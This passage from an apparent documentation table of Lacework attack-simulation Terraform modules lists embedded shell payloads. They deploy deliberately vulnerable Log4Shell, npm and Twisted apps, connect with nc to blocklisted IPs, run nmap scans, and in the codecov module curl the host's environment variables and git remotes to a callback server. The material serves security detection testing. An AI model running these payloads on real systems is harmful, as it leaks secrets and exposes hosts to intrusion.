&quot;starting app&quot;<br/>        if pgrep \-f &quot;log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar&quot;; then<br/>            kill \-9 $\(pgrep \-f &quot;log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar&quot;\)<br/>        fi<br/>        screen \-S vuln\_log4j\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_log4j\_app\_target\.log \-S vuln\_log4j\_app\_target \-m java \-jar $\{local\.app\_dir\}/log4shell\-vulnerable\-app\-0\.0\.1\-SNAPSHOT\.jar \-\-server\.port=$\{var\.inputs\[&quot;listen\_port&quot;\]\}<br/>        screen \-S vuln\_log4j\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl unzip git&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl unzip git&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    web = file\(<br/>                            &quot;$\{path\.module\}/resources/web\.py&quot;,<br/>                        \)<br/><br/>    ldap = file\(<br/>                            &quot;$\{path\.module\}/resources/ldap\.py&quot;,<br/>                        \)<br/>    requirements = file\(<br/>                            &quot;$\{path\.module\}/resources/requirements\.txt&quot;,<br/>                        \)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| attacker-vulnerable-npm-app                              | ./modules/runbook/deploy-npm-app                     | runbook_deploy_npm_app                           | context.azure.runbook.vulnerable.npm_app                          | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;npm_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8089<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-npm-app                     | <pre>locals \{<br/>    repo = &quot;https://github\.com/ForbiddenProgrammer/CVE\-2021\-21315\-PoC&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_npm\_app\_target \-X quit<br/>    truncate \-s 0 /tmp/vuln\_npm\_app\_target\.log<br/>    log &quot;checking for git\.\.\.&quot;<br/>    while \! command \-v git; do<br/>        log &quot;git not found \- waiting&quot;<br/>        sleep 10<br/>    done<br/>    log &quot;git: $\(command \-v  git\)&quot;<br/>    rm \-rf /vuln\_npm\_app\_target &amp;&amp; \\<br/>    mkdir /vuln\_npm\_app\_target &amp;&amp; \\<br/>    cd /vuln\_npm\_app\_target &amp;&amp; \\<br/>    git clone $\{local\.repo\} &amp;&amp; \\<br/>    cd CVE\-2021\-21315\-PoC &amp;&amp; \\<br/>    echo $\{base64gzip\(local\.index\_js\_base64\)\} \| base64 \-d \| gunzip &gt; index\.js<br/>    npm install &gt;&gt; $LOGFILE 2&gt;&amp;1<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen \-S vuln\_npm\_app\_target \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/vuln\_npm\_app\_target\.log \-S vuln\_npm\_app\_target \-m npm start \-\-prefix /vuln\_npm\_app\_target/CVE\-2021\-21315\-PoC<br/>        screen \-S vuln\_npm\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl nodejs npm&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl nodejs npm&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    index\_js\_base64 = templatefile\(<br/>                &quot;$\{path\.module\}/resources/index\.js&quot;,<br/>                \{<br/>                    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                \}\)<br/>    <br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| attacker-vulnerable-python3-twisted-app                  | ./modules/runbook/deploy-python3-twisted-app         | runbook_deploy_python3_twisted_app               | context.azure.runbook.vulnerable.python3_twisted_app              | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;vulnerable&quot;: {<br/>                    &quot;python3_twisted_app&quot;: {<br/>                        &quot;enabled&quot;: false,<br/>                        &quot;listen_port&quot;: 8090<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-python3-twisted-app         | <pre>locals \{<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    screen \-S vuln\_python3\_twisted\_app\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_python3\_twisted\_app\_target\.log<br/>    if command \-v $PACKAGE\_MANAGER &amp;&amp; $PACKAGE\_MANAGER list \| grep &quot;python3\-twisted&quot; \| grep &quot;18\.9\.0\-11ubuntu0\.20\.04&quot;; then<br/>        mkdir \-p /vuln\_python3\_twisted\_app<br/>        cd /vuln\_python3\_twisted\_app<br/>        echo $\{base64gzip\(local\.app\_py\)\} \| base64 \-d \| gunzip &gt; app\.py<br/>        echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip &gt; requirements\.txt<br/>        log &quot;installing requirements\.\.\.&quot;<br/>        python3 \-m pip install \-r requirements\.txt &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;requirements installed&quot;<br/>        <br/>        START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>        while true; do<br/>            log &quot;starting app&quot;<br/>            screen \-S vuln\_python3\_twisted\_app\_target \-X quit<br/>            screen \-wipe<br/>            screen \-d \-L \-Logfile /tmp/vuln\_python3\_twisted\_app\_target\.log \-S vuln\_python3\_twisted\_app\_target \-m python3 /vuln\_python3\_twisted\_app/app\.py<br/>            screen \-S vuln\_python3\_twisted\_app\_target \-X colon &quot;logfile flush 0^M&quot;<br/>            sleep 30<br/>            log &quot;check app url\.\.\.&quot;<br/>            while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>                log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>                sleep 60<br/>            done<br/>            log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>            sleep 1800<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop\.\.\.&quot;<br/>            fi<br/>        done<br/>    else<br/>        log &quot;python twisted vulnerability required the following package installed:&quot;<br/>        log &quot;python3\-twisted/focal\-updates,focal\-security,now 18\.9\.0\-11ubuntu0\.20\.04\.1&quot;<br/>    fi<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl python3\-pip&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl python3\-pip&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    app\_py = templatefile\(<br/>                &quot;$\{path\.module\}/resources/app\.py&quot;,<br/>                \{<br/>                    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                \}\)<br/>    requirements = templatefile\(<br/>                &quot;$\{path\.module\}/resources/requirements\.txt&quot;,<br/>                \{<br/>                \}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| target-runbook-connect-badip                             | ./modules/runbook/connect-badip                      | runbook_connect_bad_ip                           | context.azure.runbook.target.connect.badip                        | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;connect&quot;: {<br/>                        &quot;badip&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;iplist_url&quot;: &quot;https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset&quot;,<br/>                            &quot;retry_delay_secs&quot;: 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-badip                      | <pre>locals \{<br/>    iplist\_url = var\.inputs\[&quot;iplist\_url&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        echo $\{base64gzip\(local\.iplist\_base64\)\} \| base64 \-d \| gunzip &gt; threatdb\.csv<br/>        log &quot;enumerating bad ips in threatdb\.csv&quot;<br/>        for i in $\(grep &#x27;IPV4,&#x27; threatdb\.csv \| awk \-F&#x27;,&#x27; &#x27;\{ print $2 \}&#x27; \); do log &quot;connecting to: $i&quot;; nc \-vv \-w 5 $i 80 &gt;&gt; $LOGFILE 2&gt;&amp;1; sleep 1; done;<br/>        log &#x27;waiting $\{var\.inputs\[&quot;retry\_delay\_secs&quot;\]\} seconds\.\.\.&#x27;;<br/>        sleep $\{var\.inputs\[&quot;retry\_delay\_secs&quot;\]\}<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    iplist\_base64 = file\(&quot;$\{path\.module\}/resources/threatdb\.csv&quot;\)<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| target-runbook-connect-codecov                           | ./modules/runbook/connect-codecov                    | runbook_connect_codecov                          | context.azure.runbook.target.connect.codecov                      | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;connect&quot;: {<br/>                        &quot;codecov&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;env_secrets&quot;: [<br/>                                &quot;SECRET=supersecret123&quot;<br/>                            ],<br/>                            &quot;git_origin&quot;: &quot;git@git.localhost:repo/repo.git&quot;,<br/>                            &quot;host_ip&quot;: null,<br/>                            &quot;host_port&quot;: 8080,<br/>                            &quot;use_ssl&quot;: false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-codecov                    | <pre>locals \{<br/>    host\_ip = var\.inputs\[&quot;host\_ip&quot;\]<br/>    host\_port = var\.inputs\[&quot;host\_port&quot;\]<br/>    git\_origin=var\.inputs\[&quot;git\_origin&quot;\]<br/>    env\_secrets=join\(&quot; &quot;, var\.inputs\[&quot;env\_secrets&quot;\]\)<br/>    callback\_url = var\.inputs\[&quot;use\_ssl&quot;\] == true ? &quot;https://$\{local\.host\_ip\}:$\{local\.host\_port\}&quot; : &quot;http://$\{local\.host\_ip\}:$\{local\.host\_port\}&quot;<br/>    command\_payload=&lt;&lt;\-EOT<br/>    LOGFILE=/tmp/$\{basename\(path\.module\)\}\_command\.log<br/>    function log \{<br/>        echo \`date \-u \+&quot;%Y\-%m\-%dT%H:%M:%SZ&quot;\`&quot; $1&quot;<br/>        echo \`date \-u \+&quot;%Y\-%m\-%dT%H:%M:%SZ&quot;\`&quot; $1&quot; &gt;&gt; $LOGFILE<br/>    \}<br/>    rm \-rf /tmp/repo<br/>    mkdir \-p /tmp/repo<br/>    cd /tmp/repo<br/>    git init<br/>    git remote add origin $\{local\.git\_origin\}<br/>    log &quot;running curl post: curl \-sm 0\.5 \-d \\&quot;$\(git remote \-v\)&lt;&lt;&lt;&lt;&lt;&lt; ENV $\(env\)\\&quot; $\{local\.callback\_url\}/upload/v2&quot;<br/>    curl \-sm 0\.5 \-d &quot;$\(git remote \-v\)&lt;&lt;&lt;&lt;&lt;&lt; ENV $\(env\)&quot; $\{local\.callback\_url\}/upload/v2 &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    sleep 30<br/>    exit<br/>    EOT<br/>    base64\_command\_payload=local\.command\_payload<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        screen \-S codecov \-X quit<br/>        screen \-wipe<br/>        truncate \-s 0 /tmp/codecov\.log<br/>        log &quot;checking for git\.\.\.&quot;<br/>        while \! command \-v git; do<br/>            log &quot;git not found \- waiting&quot;<br/>            sleep 10<br/>        done<br/>        log &quot;git: $\(command \-v  git\)&quot;<br/>        screen \-d \-Logfile /tmp/codecov\.log \-S codecov \-m env \-i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $\{local\.env\_secrets\} /bin/bash \-\-noprofile \-\-norc<br/>        screen \-S codecov \-X colon &quot;logfile flush 0^M&quot;<br/>        log &#x27;sending screen command: $\{local\.command\_payload\}&#x27;;<br/>        screen \-S codecov \-p 0 \-X stuff &quot;echo &#x27;$\{base64gzip\(local\.base64\_command\_payload\)\}&#x27; \| base64 \-d \| gunzip \| /bin/bash \-^M&quot;<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;git&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;git&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| target-runbook-connect-nmap-port-scan                    | ./modules/runbook/connect-nmap-port-scan             | runbook_connect_enumerate_host                   | context.azure.runbook.target.connect.nmap_port_scan               | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;target&quot;: {<br/>                    &quot;connect&quot;: {<br/>                        &quot;nmap_port_scan&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;nmap_scan_host&quot;: &quot;portquiz.net&quot;,<br/>                            &quot;nmap_scan_ports&quot;: [<br/>                                80,<br/>                                443,<br/>                                23,<br/>                                22,<br/>                                8080,<br/>                                3389,<br/>                                27017,<br/>                                3306,<br/>                                6379,<br/>                                5432,<br/>                                389,<br/>                                636,<br/>                                1389,<br/>                                1636<br/>                            ]<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                    | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-nmap-port-scan             | <pre>locals \{<br/>    nmap\_download = &quot;https://github\.com/andrew\-d/static\-binaries/blob/master/binaries/linux/x86\_64/nmap?raw=true&quot;<br/>    nmap\_path = &quot;/tmp/nmap&quot;<br/>    nmap\_ports = join\(&quot;,&quot;,var\.inputs\[&quot;nmap\_scan\_ports&quot;\]\)<br/>    nmap\_scan\_host = var\.inputs\[&quot;nmap\_scan\_host&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        log &quot;scan target: $\{local\.nmap\_scan\_host\} $\{local\.nmap\_ports\}&quot;<br/>        log &quot;checking for nmap&quot;<br/>        if \! command \-v nmap; then<br/>            log &quot;nmap not found&quot;<br/>            log &quot;downloading: $\{local\.nmap\_download\}&quot;<br/>            if \[ \-f $\{local\.nmap\_path\} \]; then<br/>                curl \-L \-o $\{local\.nmap\_path\} $\{local\.nmap\_download\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>                chmod 755 $\{local\.nmap\_path\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>            fi<br/>            log &quot;using nmap: $\{local\.nmap\_path\}&quot;<br/>            $\{local\.nmap\_path\} \-sT \-p $\{local\.nmap\_ports\} $\{local\.nmap\_scan\_host\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        else<br/>            nmap \-sS \-p $\{local\.nmap\_ports\} $\{local\.nmap\_scan\_host\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        fi<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    